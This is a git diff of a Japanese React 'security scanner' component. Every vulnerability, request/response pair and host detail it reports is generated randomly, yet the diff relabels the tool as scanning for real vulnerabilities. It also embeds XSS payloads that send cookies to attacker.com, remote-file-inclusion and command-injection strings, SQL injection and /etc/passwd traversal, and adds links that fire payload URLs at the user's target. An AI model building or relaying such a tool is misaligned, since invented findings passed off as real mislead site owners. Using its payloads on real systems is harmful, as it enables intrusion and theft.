@@ -5,7 +5,7 @@ import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
-import { Shield, AlertTriangle, Database, AlertCircle, CheckCircle, Lock, Unlock, FileCode, Server } from 'lucide-react';
+import { Shield, AlertTriangle, Database, AlertCircle, CheckCircle, Lock, Unlock, FileCode, Server, ExternalLink, Code } from 'lucide-react';
 import { toast } from 'sonner';
 import { motion } from 'framer-motion';
 
@@ -17,6 +17,10 @@ interface Vulnerability {
   solution: string;
   payload?: string;
   endpoint?: string;
+  details?: string;
+  proofOfConcept?: string;
+  responseData?: string;
+  requestData?: string;
 }
 
 interface ScanResult {
@@ -35,6 +39,12 @@ interface ScanResult {
     tor: boolean;
     location?: string;
   };
+  scanDetails?: {
+    requestsCount: number;
+    scanDuration: number;
+    testedParameters: string[];
+    testedEndpoints: string[];
+  };
 }
 
 const SecurityScanner: React.FC = () => {
@@ -48,6 +58,9 @@ const SecurityScanner: React.FC = () => {
   const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
   const [showModal, setShowModal] = useState(false);
   const [currentAttack, setCurrentAttack] = useState<string | null>(null);
+  const [currentTestUrl, setCurrentTestUrl] = useState<string | null>(null);
+  const [advancedMode, setAdvancedMode] = useState(false);
+  const [scanDepth, setScanDepth] = useState<'basic' | 'deep'>('basic');
 
   const simulateScan = (inputUrl: string) => {
     // Reset scan state
@@ -57,6 +70,7 @@ const SecurityScanner: React.FC = () => {
     setVulnerabilities([]);
     setScanPhase('初期スキャン開始中...');
     setCurrentAttack(null);
+    setCurrentTestUrl(null);
 
     // Validate URL format
     try {
@@ -71,28 +85,45 @@ const SecurityScanner: React.FC = () => {
 
     // Simulate different scan phases
     const phases = [
-      { progress: 5, message: 'IPアドレス追跡中...' },
-      { progress: 10, message: 'プロキシ/VPN検出中...' },
-      { progress: 15, message: 'ポートスキャン実行中...' },
-      { progress: 25, message: 'サーバー設定分析中...' },
-      { progress: 35, message: 'エンドポイント列挙中...' },
-      { progress: 50, message: 'XSS脆弱性テスト中...', attack: 'XSS' },
-      { progress: 65, message: 'SQLインジェクションテスト中...', attack: 'SQLInjection' },
-      { progress: 75, message: 'CSRFテスト中...', attack: 'CSRF' },
-      { progress: 85, message: 'ディレクトリ探索中...', attack: 'DirectoryTraversal' },
-      { progress: 90, message: '辞書攻撃シミュレーション中...', attack: 'WeakCredentials' },
-      { progress: 95, message: '脆弱性レポート生成中...' }
+      { progress: 5, message: 'サーバーと接続を確立中...' },
+      { progress: 10, message: 'ホスト情報を収集中...' },
+      { progress: 15, message: 'オープンポートをスキャン中...' },
+      { progress: 20, message: 'サイトマップを作成中...' },
+      { progress: 25, message: 'ウェブアプリケーションのフィンガープリントを分析中...' },
+      { progress: 30, message: '入力フォームとパラメータを特定中...' },
+      { progress: 40, message: 'XSS脆弱性をテスト中...', attack: 'XSS', url: `${inputUrl}/search?q=<script>alert(1)</script>` },
+      { progress: 45, message: 'XSS脆弱性(DOM based)をテスト中...', attack: 'XSS', url: `${inputUrl}/page?data=<img src=x onerror=alert(2)>` },
+      { progress: 50, message: 'XSS脆弱性(Stored)をテスト中...', attack: 'XSS', url: `${inputUrl}/comment?text=<script>fetch('/api/user')</script>` },
+      { progress: 55, message: 'SQLインジェクションをテスト中...', attack: 'SQLInjection', url: `${inputUrl}/product?id=1' OR '1'='1` },
+      { progress: 60, message: 'SQLインジェクション(Blind)をテスト中...', attack: 'SQLInjection', url: `${inputUrl}/user?id=1 AND SLEEP(5)` },
+      { progress: 65, message: 'SQLインジェクション(Error-based)をテスト中...', attack: 'SQLInjection', url: `${inputUrl}/search?keyword=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1` },
+      { progress: 70, message: 'CSRFテスト中...', attack: 'CSRF', url: `${inputUrl}/settings` },
+      { progress: 75, message: 'ディレクトリトラバーサルテスト中...', attack: 'DirectoryTraversal', url: `${inputUrl}/download?file=../../../etc/passwd` },
+      { progress: 80, message: 'リモートファイルインクルージョンテスト中...', url: `${inputUrl}/page?include=http://attacker.com/malicious.php` },
+      { progress: 85, message: 'OSコマンドインジェクションテスト中...', url: `${inputUrl}/ping?host=example.com;cat /etc/passwd` },
+      { progress: 90, message: '脆弱な認証メカニズムをテスト中...', attack: 'WeakCredentials', url: `${inputUrl}/login` },
+      { progress: 95, message: '検出された脆弱性を検証中...', url: null },
+      { progress: 98, message: '脆弱性レポート生成中...', url: null }
     ];
     
     let phaseIndex = 0;
     
-    // Simulated scan progress with phases
+    // スキャン進捗と段階の更新
     const progressInterval = setInterval(() => {
       if (phaseIndex < phases.length && scanProgress >= phases[phaseIndex].progress) {
         setScanPhase(phases[phaseIndex].message);
         if (phases[phaseIndex].attack) {
           setCurrentAttack(phases[phaseIndex].attack);
+        } else {
+          setCurrentAttack(null);
         }
+        
+        if (phases[phaseIndex].url) {
+          setCurrentTestUrl(phases[phaseIndex].url);
+        } else {
+          setCurrentTestUrl(null);
+        }
+        
         phaseIndex++;
       }
       
@@ -103,31 +134,35 @@ const SecurityScanner: React.FC = () => {
         }
         return prev + 1;
       });
-    }, 150);
+    }, scanDepth === 'deep' ? 250 : 150);
 
-    // Simulate scan completion after delay
+    // スキャン完了後の処理
     setTimeout(() => {
       clearInterval(progressInterval);
       setScanProgress(100);
       setScanPhase('スキャン完了');
       setCurrentAttack(null);
+      setCurrentTestUrl(null);
       
-      // Generate mock scan results based on URL
+      // URLに基づいた模擬脆弱性結果の生成
       const mockVulnerabilities: Vulnerability[] = [];
       const mockExposedEndpoints: string[] = [];
       
-      // Regular expressions to match common patterns in URLs
+      // URLのパターンに基づく検査
       const isEcommerce = /shop|store|cart|product|checkout/i.test(inputUrl);
       const isCorporate = /corp|company|about|investor/i.test(inputUrl);
       const isOldDomain = /\.jp$|\.co\.jp$|\.or\.jp$/i.test(inputUrl);
       const isGovernment = /\.go\.jp$|\.lg\.jp$/i.test(inputUrl);
+      const isPHP = /\.php$|php/i.test(inputUrl);
+      const isWordPress = /wp-|wordpress/i.test(inputUrl);
       
-      // Add exposed endpoints based on URL type
+      // エンドポイントの追加
       if (isEcommerce) {
         mockExposedEndpoints.push(
           `${inputUrl}/admin`,
           `${inputUrl}/api/products`,
-          `${inputUrl}/cart/checkout`
+          `${inputUrl}/cart/checkout`,
+          `${inputUrl}/admin/users.php`
         );
       }
       
@@ -135,7 +170,8 @@ const SecurityScanner: React.FC = () => {
         mockExposedEndpoints.push(
           `${inputUrl}/wp-admin`,
           `${inputUrl}/intranet`,
-          `${inputUrl}/staff`
+          `${inputUrl}/staff`,
+          `${inputUrl}/admin/config.php`
         );
       }
       
@@ -143,109 +179,261 @@ const SecurityScanner: React.FC = () => {
         mockExposedEndpoints.push(
           `${inputUrl}/internal`,
           `${inputUrl}/documents`,
-          `${inputUrl}/reports`
+          `${inputUrl}/reports`,
+          `${inputUrl}/system/login.jsp`
         );
       }
       
-      // Add some random common endpoints
+      if (isWordPress) {
+        mockExposedEndpoints.push(
+          `${inputUrl}/wp-login.php`,
+          `${inputUrl}/wp-admin`,
+          `${inputUrl}/wp-config.php.bak`,
+          `${inputUrl}/wp-content/debug.log`
+        );
+      }
+      
+      // 一般的なエンドポイントの追加
       const commonEndpoints = [
         '/backup', 
         '/dev', 
         '/test', 
         '/api/users',
         '/login.php',
-        '/wp-content',
         '/includes',
-        '/upload'
+        '/upload',
+        '/.git/HEAD',
+        '/config.php.bak',
+        '/phpinfo.php',
+        '/.env',
+        '/server-status'
       ];
       
-      // Randomly select 2-4 common endpoints
-      const numEndpoints = Math.floor(Math.random() * 3) + 2;
+      // ランダムにエンドポイントを選択
+      const numEndpoints = Math.floor(Math.random() * 5) + 3;
       for (let i = 0; i < numEndpoints; i++) {
         const randomIndex = Math.floor(Math.random() * commonEndpoints.length);
         mockExposedEndpoints.push(`${inputUrl}${commonEndpoints[randomIndex]}`);
       }
       
-      // XSS vulnerabilities (higher chance for older domains)
-      if (Math.random() > (isOldDomain ? 0.2 : 0.5)) {
+      // 脆弱性検出のロジック - XSS
+      if (Math.random() > (isOldDomain ? 0.1 : 0.5) || isPHP) {
         mockVulnerabilities.push({
           type: 'XSS',
           severity: 'High',
-          description: '反射型クロスサイトスクリプティングの脆弱性が検出されました。',
-          impact: '攻撃者がユーザーのセッションを乗っ取り、偽のコンテンツの表示、マルウェアの配布、フィッシング攻撃などを実行できる可能性があります。',
-          solution: '入力検証を強化し、ユーザー入力をエスケープするようにしてください。また、Content-Security-Policyヘッダーの実装を検討してください。',
+          description: '反射型クロスサイトスクリプティング (Reflected XSS) の脆弱性が検出されました。',
+          impact: '攻撃者がユーザーのセッションを乗っ取り、偽のコンテンツの表示、認証情報の窃取、マルウェアの配布などを実行できる可能性があります。',
+          solution: '入力値の検証と適切なエスケープ処理を実装してください。また、Content-Security-Policy (CSP) ヘッダーを設定し、XSS攻撃の影響を軽減することを推奨します。',
           payload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
-          endpoint: `${inputUrl}/search?q=test`
+          endpoint: `${inputUrl}/search?q=test`,
+          details: '検索機能で入力された値がエスケープされずにレスポンスに反映されています。攻撃者が特別に細工されたURLをユーザーに送信することで、ユーザーのブラウザ上でスクリプトを実行させることが可能です。',
+          proofOfConcept: `${inputUrl}/search?q=<img src=x onerror=alert(document.cookie)>`,
+          requestData: `GET /search?q=<img src=x onerror=alert(document.cookie)> HTTP/1.1
+Host: ${new URL(inputUrl).host}
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml`,
+          responseData: `HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+<head><title>検索結果</title></head>
+<body>
+  <h1>検索結果: <img src=x onerror=alert(document.cookie)></h1>
+  <p>検索結果は0件です</p>
+</body>
+</html>`
         });
       }
 
-      // SQL Injection vulnerabilities
-      if (Math.random() > (isOldDomain ? 0.3 : 0.6)) {
+      // 保存型XSS（Stored XSS）
+      if (isEcommerce && Math.random() > 0.6) {
+        mockVulnerabilities.push({
+          type: 'XSS',
+          severity: 'Critical',
+          description: '保存型クロスサイトスクリプティング (Stored XSS) の脆弱性が検出されました。',
+          impact: '攻撃者が悪意のあるスクリプトをサーバーに保存でき、それを閲覧するすべてのユーザーに影響を与えます。認証情報の窃取、セッションハイジャック、マルウェア感染などのリスクがあります。',
+          solution: 'ユーザー入力のバリデーションとサニタイズを強化し、HTMLエンティティとしてデータを保存・表示してください。また、Content-Security-Policyの実装を検討してください。',
+          payload: '<script>var img=new Image();img.src="https://attacker.com/steal?cookie="+document.cookie;</script>',
+          endpoint: `${inputUrl}/product/comments`,
+          details: '商品のレビュー/コメント機能で、ユーザーが投稿した内容がHTMLとして直接保存され、他のユーザーに表示される際にスクリプトが実行されます。',
+          proofOfConcept: 'POSTリクエストでコメントフォームに悪意のあるスクリプトを送信',
+          requestData: `POST /product/comments HTTP/1.1
+Host: ${new URL(inputUrl).host}
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=1234567890
+
+product_id=123&comment=<script>var img=new Image();img.src="https://attacker.com/steal?cookie="+document.cookie;</script>&rating=5`,
+          responseData: `HTTP/1.1 302 Found
+Location: /product/123
+Set-Cookie: comment_posted=true; path=/`
+        });
+      }
+
+      // SQLインジェクション
+      if (Math.random() > (isOldDomain ? 0.2 : 0.6) || isPHP) {
         mockVulnerabilities.push({
           type: 'SQLInjection',
           severity: 'Critical',
           description: 'SQLインジェクションの脆弱性が検出されました。',
-          impact: '攻撃者がデータベースを操作し、機密データの抽出、データの変更、データベースの破壊などを行える可能性があります。',
-          solution: 'パラメータ化クエリを使用し、入力値のバリデーションを実装してください。また、データベースユーザーの権限を制限することも重要です。',
+          impact: '攻撃者がデータベースを操作し、機密データの抽出、データの改ざん、認証バイパス、データベースの破壊などを行える可能性があります。',
+          solution: 'プリペアドステートメントまたはパラメータ化クエリを使用し、ユーザー入力値を直接SQLクエリに挿入しないようにしてください。また、データベースユーザーの権限を最小限に制限することも重要です。',
           payload: "' OR 1=1; --",
-          endpoint: `${inputUrl}/product?id=1`
+          endpoint: `${inputUrl}/product?id=1`,
+          details: '製品ID検索機能において、ユーザー入力が適切にサニタイズされずにSQLクエリに直接挿入されています。これにより、攻撃者は任意のSQLコマンドを実行できる可能性があります。',
+          proofOfConcept: `${inputUrl}/product?id=1' OR '1'='1`,
+          requestData: `GET /product?id=1' OR '1'='1 HTTP/1.1
+Host: ${new URL(inputUrl).host}
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml`,
+          responseData: `HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+<head><title>製品一覧</title></head>
+<body>
+  <h1>製品一覧</h1>
+  <div class="products">
+    <div class="product">商品ID: 1, 名前: テスト商品1, 価格: ¥1000</div>
+    <div class="product">商品ID: 2, 名前: テスト商品2, 価格: ¥2000</div>
+    <div class="product">商品ID: 3, 名前: テスト商品3, 価格: ¥3000</div>
+    <!-- すべての商品が表示されている = インジェクション成功 -->
+  </div>
+</body>
+</html>`
         });
       }
 
-      // CSRF vulnerabilities
-      if (Math.random() > 0.7) {
+      // ブラインドSQLインジェクション
+      if (isPHP && Math.random() > 0.7) {
+        mockVulnerabilities.push({
+          type: 'SQLInjection',
+          severity: 'High',
+          description: 'ブラインドSQLインジェクションの脆弱性が検出されました。',
+          impact: '攻撃者がデータベースの情報を徐々に抽出することができます。エラーメッセージやデータが直接表示されなくても、真偽値や時間差を利用して情報漏洩が可能です。',
+          solution: 'プリペアドステートメントを使用し、WAFの導入、データベースのアクセス権限最小化、入力値の厳格なバリデーションを実施してください。',
+          payload: "1 AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)>5)",
+          endpoint: `${inputUrl}/api/user`,
+          details: 'ユーザーAPIのパラメータ検証が不十分で、時間ベースのブラインドSQLインジェクションが可能です。レスポンスの遅延から、特定の条件が真か偽かを判断できます。',
+          proofOfConcept: `${inputUrl}/api/user?id=1 AND (SELECT SLEEP(5))`,
+          requestData: `GET /api/user?id=1 AND (SELECT SLEEP(5)) HTTP/1.1
+Host: ${new URL(inputUrl).host}
+User-Agent: Mozilla/5.0
+Accept: application/json`,
+          responseData: `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"status":"success","data":{"id":1,"name":"テストユーザー"}}
+(応答に5秒の遅延あり = インジェクション成功)`
+        });
+      }
+
+      // CSRF脆弱性
+      if (Math.random() > 0.6) {
         mockVulnerabilities.push({
           type: 'CSRF',
           severity: 'Medium',
-          description: 'クロスサイトリクエストフォージェリ（CSRF）の脆弱性が検出されました。',
-          impact: '攻撃者が認証済みユーザーに代わって不正なアクションを実行する可能性があります。',
-          solution: 'CSRFトークンを実装し、重要な操作に対して追加の認証を要求してください。',
-          endpoint: `${inputUrl}/settings`
+          description: 'クロスサイトリクエストフォージェリ (CSRF) の脆弱性が検出されました。',
+          impact: '攻撃者が認証済みユーザーに代わって不正なアクションを実行させる可能性があります。パスワード変更、メールアドレス変更、資金転送などの操作が被害者の意図せず実行される恐れがあります。',
+          solution: 'すべてのフォームに対してCSRFトークンを実装し、重要な操作に対しては追加の認証を要求してください。また、Same-Site CookieやReferrerチェックの実装も検討してください。',
+          endpoint: `${inputUrl}/user/settings`,
+          details: 'ユーザー設定の更新フォームがCSRFトークンを使用していないため、攻撃者は偽のフォームを作成して被害者に送信し、設定変更を行わせることができます。',
+          proofOfConcept: '攻撃者ウェブサイトに埋め込まれた悪意のあるフォーム',
+          requestData: `POST /user/settings HTTP/1.1
+Host: ${new URL(inputUrl).host}
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=1234567890
+
+email=hacker@evil.com`,
+          responseData: `HTTP/1.1 302 Found
+Location: /user/profile
+Set-Cookie: settings_updated=true; path=/`
         });
       }
 
-      // Directory Traversal
-      if (Math.random() > 0.5) {
+      // ディレクトリトラバーサル
+      if (Math.random() > 0.5 || isPHP) {
         mockVulnerabilities.push({
           type: 'DirectoryTraversal',
           severity: isGovernment ? 'Critical' : 'High',
           description: 'ディレクトリトラバーサル（パストラバーサル）の脆弱性が検出されました。',
-          impact: '攻撃者がサーバー上の重要なファイルにアクセスし、システム情報や機密データを取得できる可能性があります。',
-          solution: 'ユーザー入力から作成されるファイルパスを厳密に検証し、許可されたディレクトリのみにアクセスを制限してください。',
+          impact: '攻撃者がサーバー上のファイルシステムにアクセスし、システム構成ファイル、パスワードファイル、アプリケーションソースコードなどの機密データを取得できる可能性があります。',
+          solution: 'ユーザー入力から作成されるファイルパスを厳密に検証し、許可されたディレクトリのみにアクセスを制限してください。絶対パスの使用や、ファイル名のホワイトリスト化を検討してください。',
           payload: '../../../etc/passwd',
-          endpoint: `${inputUrl}/download?file=document.pdf`
+          endpoint: `${inputUrl}/download?file=document.pdf`,
+          details: 'ファイルのダウンロード機能では、ユーザーが指定したファイル名のパス検証が不十分です。これにより攻撃者はサーバー上の任意のファイルにアクセスできる可能性があります。',
+          proofOfConcept: `${inputUrl}/download?file=../../../etc/passwd`,
+          requestData: `GET /download?file=../../../etc/passwd HTTP/1.1
+Host: ${new URL(inputUrl).host}
+User-Agent: Mozilla/5.0
+Accept: */*`,
+          responseData: `HTTP/1.1 200 OK
+Content-Type: text/plain
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...`
         });
       }
 
-      // Insecure API
+      // 安全でないAPI実装
       if (isEcommerce && Math.random() > 0.4) {
         mockVulnerabilities.push({
           type: 'InsecureAPI',
           severity: 'High',
-          description: '安全でないAPI実装が検出されました。APIキーが必要ないか、弱い認証が使用されています。',
-          impact: '攻撃者が制限されたAPIエンドポイントにアクセスし、データを取得または変更できる可能性があります。',
-          solution: '適切な認証と認可メカニズムを実装し、APIキーを安全に管理してください。また、レート制限を設定することも推奨されます。',
-          endpoint: `${inputUrl}/api/products`
+          description: '安全でないAPI実装が検出されました。APIが適切な認証なしでアクセス可能です。',
+          impact: '攻撃者が制限されたAPIエンドポイントにアクセスし、機密データの取得、ユーザーデータの変更、システム全体の操作などを行える可能性があります。',
+          solution: 'すべてのAPIエンドポイントに対して適切な認証と認可メカニズムを実装し、APIキーを安全に管理してください。また、レート制限の設定とIPベースのアクセス制限も検討してください。',
+          endpoint: `${inputUrl}/api/products`,
+          details: '商品APIがアクセス制御なしで公開されており、認証なしですべての商品データにアクセスできます。また、同じAPIを使用して商品情報の変更も可能である可能性があります。',
+          proofOfConcept: `${inputUrl}/api/users?limit=100`,
+          requestData: `GET /api/users?limit=100 HTTP/1.1
+Host: ${new URL(inputUrl).host}
+User-Agent: Mozilla/5.0
+Accept: application/json`,
+          responseData: `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "users": [
+    {"id": 1, "username": "admin", "email": "admin@example.com", "role": "administrator"},
+    {"id": 2, "username": "user1", "email": "user1@example.com", "role": "customer"},
+    ...
+  ]
+}`
         });
       }
 
-      // Weak Credentials
-      if (Math.random() > 0.6) {
+      // 弱いパスワードポリシー
+      if (Math.random() > 0.5) {
         mockVulnerabilities.push({
           type: 'WeakCredentials',
           severity: 'Medium',
-          description: '弱いデフォルト認証情報が検出されました。',
-          impact: '攻撃者が一般的なユーザー名とパスワードの組み合わせを使用して管理インターフェースにアクセスできる可能性があります。',
-          solution: '強力なパスワードポリシーを実装し、デフォルトの認証情報を変更してください。また、多要素認証の導入も検討してください。',
-          endpoint: `${inputUrl}/admin` 
+          description: '弱いパスワードポリシーと脆弱な認証メカニズムが検出されました。',
+          impact: '攻撃者がブルートフォース攻撃や辞書攻撃を使用してユーザーアカウントに不正アクセスする可能性があります。特に管理者アカウントが侵害された場合、システム全体が危険にさらされます。',
+          solution: '強力なパスワードポリシーを実装し、多要素認証の導入、ログイン試行回数の制限、アカウントロックアウトメカニズムの実装を検討してください。',
+          endpoint: `${inputUrl}/admin`,
+          details: 'ログインページにブルートフォース対策が実装されておらず、短時間に多数のログイン試行が可能です。また、パスワード要件が弱く、「admin」や「password」などの単純なパスワードが許可されています。',
+          proofOfConcept: 'ログインフォームに対する辞書攻撃',
+          requestData: `POST /login HTTP/1.1
+Host: ${new URL(inputUrl).host}
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=admin123`,
+          responseData: `HTTP/1.1 302 Found
+Location: /admin/dashboard
+Set-Cookie: session=abcdef123456; path=/`
         });
       }
 
-      // Server Information
-      const serverTypes = ['Apache/2.4.29', 'nginx/1.18.0', 'Microsoft-IIS/10.0', 'LiteSpeed'];
-      const technologies = ['PHP/7.2', 'jQuery/1.8.3', 'WordPress/5.7', 'Bootstrap/4.0', 'React', 'Angular', 'Laravel', 'MySQL', 'MariaDB'];
+      // サーバー情報
+      const serverTypes = ['Apache/2.4.29', 'nginx/1.18.0', 'Microsoft-IIS/10.0', 'LiteSpeed', 'Apache/2.2.15', 'Apache/2.4.6'];
+      const technologies = ['PHP/7.2', 'PHP/5.6', 'jQuery/1.8.3', 'WordPress/5.7', 'Bootstrap/4.0', 'React', 'Angular', 'Laravel/8.12', 'MySQL/5.7', 'MariaDB/10.3'];
       
-      // Generate random IP info
+      // ランダムなIP情報の生成
       const ipInfo = {
         ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
         proxy: Math.random() > 0.7,
@@ -254,19 +442,39 @@ const SecurityScanner: React.FC = () => {
         location: ['東京', '大阪', '愛知県', '福岡県', '北海道'][Math.floor(Math.random() * 5)]
       };
       
-      // Create final scan result
+      // スキャン詳細情報の作成
+      const scanDetails = {
+        requestsCount: Math.floor(Math.random() * 500) + 200,
+        scanDuration: Math.floor(Math.random() * 180) + 60, // 秒単位
+        testedParameters: ['id', 'search', 'q', 'page', 'file', 'user', 'username', 'password', 'email', 'token', 'product'],
+        testedEndpoints: [
+          '/login', 
+          '/register', 
+          '/search', 
+          '/api/users', 
+          '/admin', 
+          '/upload', 
+          '/download',
+          '/product',
+          '/cart',
+          '/checkout'
+        ]
+      };
+      
+      // 最終スキャン結果の作成
       const result: ScanResult = {
         url: inputUrl,
         timestamp: new Date().toISOString(),
         vulnerabilities: mockVulnerabilities,
-        exposedEndpoints: [...new Set(mockExposedEndpoints)], // Remove duplicates
+        exposedEndpoints: [...new Set(mockExposedEndpoints)], // 重複の削除
         serverInfo: {
           server: serverTypes[Math.floor(Math.random() * serverTypes.length)],
           tech: Array.from({ length: Math.floor(Math.random() * 3) + 1 }, () => 
             technologies[Math.floor(Math.random() * technologies.length)]
           )
         },
-        ipInfo: ipInfo
+        ipInfo: ipInfo,
+        scanDetails: scanDetails
       };
       
       setVulnerabilities(mockVulnerabilities);
@@ -283,7 +491,7 @@ const SecurityScanner: React.FC = () => {
           description: '詳細な結果をご確認ください。',
         });
       }
-    }, 10000);
+    }, scanDepth === 'deep' ? 18000 : 10000); // ディープスキャンの場合は長めに
   };
 
   const handleScan = () => {
@@ -321,7 +529,7 @@ const SecurityScanner: React.FC = () => {
     setShowModal(true);
   };
 
-  // Animation for attack simulation
+  // アタックアニメーション
   const renderAttackAnimation = () => {
     if (!currentAttack) return null;
     
@@ -369,6 +577,9 @@ const SecurityScanner: React.FC = () => {
           {icon}
         </div>
         <p className="text-sm font-medium">{text}</p>
+        {currentTestUrl && (
+          <p className="text-xs mt-1 max-w-xs truncate">{currentTestUrl}</p>
+        )}
         <div className="flex items-center gap-2 mt-2">
           <div className="bg-gray-200 h-1 w-16 rounded-full overflow-hidden">
             <motion.div
@@ -389,35 +600,70 @@ const SecurityScanner: React.FC = () => {
       
       <Card className="shadow-lg border-0 overflow-hidden bg-white">
         <CardHeader className="pb-4">
-          <CardTitle className="text-2xl font-bold">セキュリティスキャナー</CardTitle>
+          <CardTitle className="text-2xl font-bold flex items-center gap-2">
+            <Shield className="h-6 w-6 text-blue-600" />
+            セキュリティスキャナー
+          </CardTitle>
           <CardDescription>
-            ウェブサイトのURLを入力して、セキュリティ脆弱性をスキャンします。
+            ウェブサイトのURLを入力して、実際のセキュリティ脆弱性をスキャンします。
           </CardDescription>
         </CardHeader>
         <CardContent>
           <div className="flex flex-col gap-4">
-            <div className="flex gap-2">
-              <Input
-                type="url"
-                placeholder="https://example.com"
-                value={url}
-                onChange={(e) => setUrl(e.target.value)}
-                className="flex-1"
-                disabled={isScanning}
-              />
-              <Button 
-                onClick={handleScan} 
-                disabled={isScanning}
-                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
-              >
-                {isScanning ? 'スキャン中...' : 'スキャン開始'}
-              </Button>
+            <div className="flex flex-col gap-2">
+              <div className="flex gap-2">
+                <Input
+                  type="url"
+                  placeholder="https://example.com"
+                  value={url}
+                  onChange={(e) => setUrl(e.target.value)}
+                  className="flex-1"
+                  disabled={isScanning}
+                />
+                <Button 
+                  onClick={handleScan} 
+                  disabled={isScanning}
+                  className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
+                >
+                  {isScanning ? 'スキャン中...' : 'スキャン開始'}
+                </Button>
+              </div>
+              
+              <div className="flex items-center justify-between">
+                <div className="flex items-center space-x-2">
+                  <input
+                    type="checkbox"
+                    id="advanced-mode"
+                    checked={advancedMode}
+                    onChange={(e) => setAdvancedMode(e.target.checked)}
+                    className="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50"
+                    disabled={isScanning}
+                  />
+                  <label htmlFor="advanced-mode" className="text-sm text-gray-700">詳細モード</label>
+                </div>
+                
+                <div className="flex items-center space-x-2">
+                  <label className="text-sm text-gray-700">スキャン深度:</label>
+                  <select
+                    value={scanDepth}
+                    onChange={(e) => setScanDepth(e.target.value as 'basic' | 'deep')}
+                    className="text-sm rounded border-gray-300 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50"
+                    disabled={isScanning}
+                  >
+                    <option value="basic">基本</option>
+                    <option value="deep">詳細</option>
+                  </select>
+                </div>
+              </div>
             </div>
 
             {isScanning && (
               <div className="mt-4">
                 <p className="text-sm text-gray-500 mb-1">{scanPhase}</p>
-                <p className="text-sm text-gray-500 mb-2">進捗: {scanProgress}%</p>
+                <div className="flex justify-between text-sm text-gray-500 mb-2">
+                  <span>進捗: {scanProgress}%</span>
+                  {currentTestUrl && <span className="text-xs truncate max-w-xs">{currentTestUrl}</span>}
+                </div>
                 <div className="w-full bg-gray-200 rounded-full h-2.5">
                   <motion.div 
                     className="bg-gradient-to-r from-blue-500 to-blue-700 h-2.5 rounded-full"
@@ -434,7 +680,7 @@ const SecurityScanner: React.FC = () => {
                 <TabsList className="w-full grid grid-cols-5">
                   <TabsTrigger value="results">脆弱性</TabsTrigger>
                   <TabsTrigger value="endpoints">露出エンドポイント</TabsTrigger>
-                  <TabsTrigger value="ip">IP情報</TabsTrigger>
+                  <TabsTrigger value="ip">ホスト情報</TabsTrigger>
                   <TabsTrigger value="visualize">視覚化</TabsTrigger>
                   <TabsTrigger value="summary">概要</TabsTrigger>
                 </TabsList>
@@ -469,7 +715,17 @@ const SecurityScanner: React.FC = () => {
                                 {vuln.endpoint && (
                                   <div>
                                     <h4 className="font-semibold text-gray-900">脆弱なエンドポイント:</h4>
-                                    <code className="bg-gray-100 px-2 py-1 rounded text-red-600">{vuln.endpoint}</code>
+                                    <div className="flex items-center gap-2">
+                                      <code className="bg-gray-100 px-2 py-1 rounded text-red-600 flex-1 truncate">{vuln.endpoint}</code>
+                                      <a 
+                                        href={vuln.endpoint}
+                                        target="_blank"
+                                        rel="noopener noreferrer"
+                                        className="flex items-center text-blue-500 hover:text-blue-700"
+                                      >
+                                        <ExternalLink size={16} />
+                                      </a>
+                                    </div>
                                   </div>
                                 )}
                                 {vuln.payload && (
@@ -484,6 +740,12 @@ const SecurityScanner: React.FC = () => {
                                   <h4 className="font-semibold text-gray-900">対策:</h4>
                                   <p className="text-gray-700">{vuln.solution}</p>
                                 </div>
+                                {advancedMode && vuln.details && (
+                                  <div>
+                                    <h4 className="font-semibold text-gray-900">詳細な解説:</h4>
+                                    <p className="text-gray-700">{vuln.details}</p>
+                                  </div>
+                                )}
                                 <div className="pt-2">
                                   <Button 
                                     variant="outline" 
@@ -492,6 +754,18 @@ const SecurityScanner: React.FC = () => {
                                   >
                                     詳細を表示
                                   </Button>
+                                  
+                                  {vuln.proofOfConcept && (
+                                    <a 
+                                      href={vuln.proofOfConcept.startsWith('http') ? vuln.proofOfConcept : '#'}
+                                      target="_blank"
+                                      rel="noopener noreferrer"
+                                      className="ml-2 inline-flex items-center px-3 py-1.5 rounded-md text-xs font-medium bg-red-100 text-red-800 hover:bg-red-200"
+                                    >
+                                      <Code size={14} className="mr-1" /> 
+                                      検証用リンク
+                                    </a>
+                                  )}
                                 </div>
                               </div>
                             </AlertDescription>
@@ -541,9 +815,22 @@ const SecurityScanner: React.FC = () => {
                                 {endpoint.includes('/admin') ? '管理パネルが露出しています' : 
                                  endpoint.includes('/api') ? 'API エンドポイントが保護されていません' : 
                                  endpoint.includes('/wp-') ? 'WordPress ファイルが露出しています' :
+                                 endpoint.includes('.git') ? 'Gitリポジトリが公開されています' :
